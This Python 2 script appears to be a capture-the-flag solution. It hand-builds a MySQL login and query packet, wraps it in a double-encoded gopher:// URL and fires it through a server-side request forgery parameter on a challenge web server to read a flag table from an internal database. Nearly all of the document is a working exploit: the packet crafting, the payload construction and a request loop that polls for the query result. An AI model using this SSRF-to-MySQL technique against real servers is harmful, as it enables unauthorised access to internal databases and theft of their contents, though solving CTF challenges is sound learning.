#!/usr/bin/env python
# coding=utf-8

from socket import *
from struct import *
from urllib2 import quote, unquote
import sys
import hashlib
import time
import requests as req


class Protocal:
    last_packet_index = 0
    connect_status = 0  # mark last connection is finish or no
    login_packet = ''

    def __init__(self, host, port, username, password, database):
        self.username = username
        self.password = password
        self.database = database
        self.host = host
        self.port = port

    def __pack(self, data):
        if self.connect_status == 0:
            self.last_packet_index += 1
        elif self.connect_status == 1:
            self.last_packet_index = 0
        header = len(data)
        header = pack('<I', len(data))[:3]+pack('B', self.last_packet_index)
        return header+data

    def encode_password(self, password, scramble):
        if password:
            stage1_hash = self.__sha1(password)
            token = self.xor_string(self.__sha1(
                scramble+self.__sha1(stage1_hash)), stage1_hash)
            return token
        else:
            return ""

    def xor_string(self, str1, str2):
        r = ''
        for x, y in zip(str1, str2):
            r += chr(ord(x) ^ ord(y))
        return r

    def __sha1(self, data):
        m = hashlib.sha1()
        m.update(data)
        return m.digest()

    def get_client_capabilities(self):
        CLIENT_LONG_PASSWORD = 0x0001
        CLIENT_FOUND_ROWS = 0x0002
        CLIENT_LONG_FLAG = 0x0004
        CLIENT_CONNECT_WITH_DB = 0x0008
        CLIENT_ODBC = 0x0040
        CLIENT_IGNORE_SPACE = 0x0100
        CLIENT_PROTOCOL_41 = 0x0200
        CLIENT_INTERACTIVE = 0x0400
        CLIENT_IGNORE_SIGPIPE = 0x1000
        CLIENT_TRANSACTIONS = 0x2000
        CLIENT_SECURE_CONNECTION = 0x8000
        flag = 0
        flag = flag | CLIENT_LONG_PASSWORD | CLIENT_FOUND_ROWS | CLIENT_LONG_FLAG | CLIENT_CONNECT_WITH_DB | CLIENT_ODBC | CLIENT_IGNORE_SPACE | CLIENT_PROTOCOL_41 | CLIENT_INTERACTIVE | CLIENT_IGNORE_SIGPIPE | CLIENT_TRANSACTIONS | CLIENT_SECURE_CONNECTION
        return pack('I', flag)

    def __write(self, data):
        return self.sock.send(data)

    def __read(self, lentgh):
        return self.sock.recv(lentgh)

    def __get_login_packet(self, scramble):
        packet = ''
        packet += self.get_client_capabilities()  # clientFlags
        packet += pack('I', 1024*1024*16)  # maxPacketSize
        packet += b'\x21'  # charset 0x21=utf8
        packet += b'\x00'*23
        packet += self.username+b'\x00'
        passowrd = self.encode_password(self.password, scramble)
        packet += chr(len(passowrd))+passowrd
        packet += self.database + b'\x00'
        packet = self.__pack(packet)
        return packet

    def get_payload(self, _sql, size, verbose):
        if _sql[-1] == ';':
            _sql = _sql[:-1]
        sql = _sql
        if verbose:
            print 'sql: ', sql
        login_packet = self.__get_login_packet('')
        self.connect_status = 1
        packet = self.__pack(b'\x03'+sql)
        return login_packet + packet


def main():
    protocal = Protocal('ctf_web1_1', 3306,
                        'yuligeeee123321', '', '')
    payload = protocal.get_payload(
        'select flag from fla4441111g.F1111llllggggg', 10, 0)+'\x00'*4
    pl = 'gopher://172.11.243.218:3306/_'+quote(quote(payload))
    tt = False
    url = "http://ctf473831530.yulige.top:12345/?url="+pl
    print("[+] URL : %s" % url)
    while not tt:
        res = req.get(url)
        c = res.content
        c = c[c.find(b'</code>')+7:-1]
        if b'bool(false)' not in c:
            print '[+] Result : '
            print c
            tt = True


if __name__ == '__main__':
    main()
